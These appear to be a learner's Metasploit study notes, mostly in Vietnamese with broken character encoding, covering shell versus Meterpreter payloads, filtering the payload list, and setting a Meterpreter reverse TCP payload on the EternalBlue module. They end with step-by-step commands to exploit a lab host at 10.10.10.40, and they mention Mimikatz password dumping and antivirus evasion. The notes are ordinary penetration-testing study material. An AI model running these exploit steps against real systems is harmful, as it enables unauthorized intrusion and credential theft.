    Ho·∫∑c Meterpreter
  Payload th∆∞·ªùng (Shell payloads)
    V√≠ d·ª•: windows/shell/reverse_tcp, linux/x86/shell_bind_tcp.
    Sau khi exploit th√†nh c√¥ng ‚Üí b·∫°n nh·∫≠n ƒë∆∞·ª£c command shell c∆° b·∫£n (cmd.exe tr√™n Windows, /bin/sh tr√™n Linux).
  Meterpreter payloads
    V√≠ d·ª•: windows/meterpreter/reverse_tcp.
    Sau khi exploit th√†nh c√¥ng ‚Üí b·∫°n nh·∫≠n ƒë∆∞·ª£c Meterpreter session (giao di·ªán ri√™ng trong msfconsole).
    Session n√†y nhi·ªÅu t√≠nh nƒÉng h∆°n h·∫≥n so v·ªõi shell payload.

T√¨m ki·∫øm Payloads trong Metasploit
  Khi ch·ªçn payload, c·∫ßn x√°c ƒë·ªãnh m·ª•c ti√™u m√¨nh mu·ªën l√†m g√¨ tr√™n m√°y n·∫°n nh√¢n.
    V√≠ d·ª•: mu·ªën duy tr√¨ quy·ªÅn truy c·∫≠p l√¢u d√†i (persistence) ‚Üí n√™n ch·ªçn Meterpreter payload.
‚ö° ∆Øu ƒëi·ªÉm c·ªßa Meterpreter
  Cung c·∫•p nhi·ªÅu ch·ª©c nƒÉng m·∫°nh m·∫Ω s·∫µn c√≥.
  C√≥ th·ªÉ t·ª± ƒë·ªông h√≥a v√† k·∫øt h·ª£p v·ªõi plugin (v√≠ d·ª• plugin Mimikatz c·ªßa GentilKiwi) ƒë·ªÉ:
    Tr√≠ch xu·∫•t m·∫≠t kh·∫©u
    Th·ª±c hi·ªán post-exploitation nhanh ch√≥ng
  Gi√∫p pentest c√≥ t·ªï ch·ª©c, ti·∫øt ki·ªám th·ªùi gian.
üìå C√°ch xem payloads
  Trong msfconsole, d√πng l·ªánh: show payloads
    ‚Üí s·∫Ω li·ªát k√™ to√†n b·ªô payload c√≥ s·∫µn (bao g·ªìm shell payloads v√† Meterpreter payloads).

T√≥m l·∫°i: Payload ch·ªçn tu·ª≥ theo m·ª•c ti√™u, nh∆∞ng n·∫øu c·∫ßn kh·∫£ nƒÉng m·ªü r·ªông, linh ho·∫°t, post-exploitation chuy√™n s√¢u ‚Üí ch·ªçn Meterpreter.

Ch·ªçn Payload trong Metasploit
  Metasploit c√≥ r·∫•t nhi·ªÅu payload ƒë·ªÉ ch·ªçn.
  Ngo√†i payload c√≥ s·∫µn, ta c√≤n c√≥ th·ªÉ t·ª± t·∫°o payload b·∫±ng msfvenom (s·∫Ω h·ªçc sau).
üîπ Th·ª≠ nghi·ªám v·ªõi target Windows 7 (x64)
  M·∫∑c ƒë·ªãnh exploit s·∫Ω d√πng payload ƒë∆°n gi·∫£n: reverse_tcp_shell.
  Nh∆∞ng ·ªü ƒë√¢y ta thay th·∫ø b·∫±ng m·ªôt Meterpreter payload d√†nh cho Windows 7 (x64).
üîπ C√°ch ch·ªçn
  Trong danh s√°ch payloads (show payloads), cu·ªôn xu·ªëng s·∫Ω th·∫•y ph·∫ßn Meterpreter Payloads cho Windows (x64).
  T·ª´ ƒë√≥ ta ch·ªçn ƒë√∫ng payload ph√π h·ª£p ƒë·ªÉ d√πng.
üëâ √ù ch√≠nh: Thay v√¨ d√πng payload m·∫∑c ƒë·ªãnh (reverse shell ƒë∆°n gi·∫£n), ta ch·ªçn Meterpreter x64 payload cho Windows 7 ƒë·ªÉ c√≥ nhi·ªÅu t√≠nh nƒÉng h∆°n.

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

MSF - Searching for Specific Payload

  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads
     6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
     7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
     8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
     9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
     10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
     11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
     12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
     13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
     14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
     16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
     17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
     18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
     19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads
  [*] 14

  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
    => ch·ªâ c√≤n show ra 3 k·∫øt qu·∫£ 

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Selecting Payloads

  msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
  Module options (exploit/windows/smb/ms17_010_eternalblue):
     Name           Current Setting  Required  Description
     ----           ---------------  --------  -----------
     RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
     RPORT          445              yes       The target port (TCP)
     SMBDomain      .                no        (Optional) The Windows domain to use for authentication
     SMBPass                         no        (Optional) The password for the specified username
     SMBUser                         no        (Optional) The username to authenticate as
     VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
     VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.
  Exploit target:
     Id  Name
     --  ----
     0   Windows 7 and Server 2008 R2 (x64) All Service Packs
  msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads
     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
     16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
     17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
  msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
  payload => windows/x64/meterpreter/reverse_tcp

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

MSF - Meterpreter Commands

  meterpreter > help

Khi b·∫°n exploit th√†nh c√¥ng b·∫±ng m·ªôt payload ki·ªÉu Meterpreter reverse TCP, th√¨ quy tr√¨nh nh∆∞ sau:
1. Stager tr√™n m√°y n·∫°n nh√¢n ch·∫°y ‚Üí n√≥ t·∫°o k·∫øt n·ªëi ng∆∞·ª£c (reverse connection) v·ªÅ m√°y attacker.
2. Ngay khi k·∫øt n·ªëi th√†nh c√¥ng, framework (Metasploit) s·∫Ω t·ª± ƒë·ªông m·ªü m·ªôt Channel ƒë·ªÉ qu·∫£n l√Ω lu·ªìng d·ªØ li·ªáu qua l·∫°i.
  Channel 1 th∆∞·ªùng l√† k·∫øt n·ªëi ch√≠nh (reverse TCP session).
  N·∫øu sau n√†y b·∫°n m·ªü th√™m shell, webcam, hay file transfer th√¨ n√≥ c√≥ th·ªÉ t·∫°o ra Channel 2, 3,‚Ä¶ ƒë·ªÉ ph·ª•c v·ª• c√°c ch·ª©c nƒÉng ri√™ng.
L√∫c n√†y Metasploit b√°o "Meterpreter session x opened" ‚Üí nghƒ©a l√† channel ch√≠nh ƒë√£ ƒë∆∞·ª£c t·∫°o v√† b·∫°n ƒë∆∞·ª£c ƒë∆∞a v√†o CLI c·ªßa Meterpreter.
üëâ V·∫≠y n√™n: kh√¥ng c·∫ßn b·∫°n t·ª± t·∫°o channel b·∫±ng tay, m√† n√≥ s·∫Ω t·ª± ƒë·ªông sinh ra ngay khi payload k·∫øt n·ªëi v·ªÅ th√†nh c√¥ng.

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

Payload Types

| **Payload**                           | **M√¥ t·∫£**                                          | **ƒê·∫∑c ƒëi·ªÉm ch√≠nh**                                                       |
| ------------------------------------- | -------------------------------------------------- | ------------------------------------------------------------------------ |
| **generic/custom**                    | Payload chung, do ng∆∞·ªùi d√πng t·ª± ƒë·ªãnh nghƒ©a         | Linh ho·∫°t, ƒëa n·ªÅn t·∫£ng                                                   |
| **generic/shell\_bind\_tcp**          | Bind shell TCP c∆° b·∫£n                              | Victim l·∫Øng nghe, attacker k·∫øt n·ªëi v√†o                                   |
| **generic/shell\_reverse\_tcp**       | Reverse shell TCP c∆° b·∫£n                           | Victim k·∫øt n·ªëi ng∆∞·ª£c v·ªÅ attacker                                         |
| **windows/x64/exec**                  | Th·ª±c thi l·ªánh b·∫•t k·ª≥ (VD: `calc.exe`)              | Ch·∫°y tr·ª±c ti·∫øp m·ªôt process                                               |
| **windows/x64/loadlibrary**           | Load m·ªôt th∆∞ vi·ªán DLL x64                          | D√πng ƒë·ªÉ n·∫°p DLL t√πy √Ω                                                    |
| **windows/x64/messagebox**            | Hi·ªán h·ªôp tho·∫°i MessageBox                          | Ch·ªß y·∫øu ƒë·ªÉ test, PoC                                                     |
| **windows/x64/shell\_reverse\_tcp**   | Reverse shell, **single payload**                  | To√†n b·ªô shellcode n·∫±m trong 1 payload                                    |
| **windows/x64/shell/reverse\_tcp**    | Reverse shell, **staged payload** (stager + stage) | Nh·∫π ban ƒë·∫ßu, t·∫£i th√™m sau                                                |
| **windows/x64/shell/bind\_ipv6\_tcp** | Bind shell tr√™n IPv6                               | D√πng trong m·∫°ng IPv6                                                     |
| **windows/x64/meterpreter/**          | Meterpreter reverse/bind/...                       | Nhi·ªÅu t√≠nh nƒÉng n√¢ng cao (file, webcam, keylogger, pivot, dump hash,...) |
| **windows/x64/powershell/**           | Payload PowerShell                                 | Cho session PowerShell, d·ªÖ bypass AV/EDR                                 |
| **windows/x64/vncinject/**            | VNC server reflective injection                    | Cho attacker truy c·∫≠p GUI desktop c·ªßa victim                             |



















//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
Frist time, you need search keyword 
  searchsploit openssh 7.2

Open metasploit 
  msfconsole

Search modules exploit 
  search exploit CVE-XXXX-XXXX

Use module 
  use 0     // can be use ordinal or module name
  use exploit/windows/smb/ms17_010_psexec

What option we need ? 
  show options

How to setup ? when you know options you need config 
  set RHOSTS 10.10.10.40
  set LHOST tun0

We done ? yes. In the final step, you need to exploit
But you need to check that to ensure sever is vulnerable 
  check

Ok final 
  exploit 






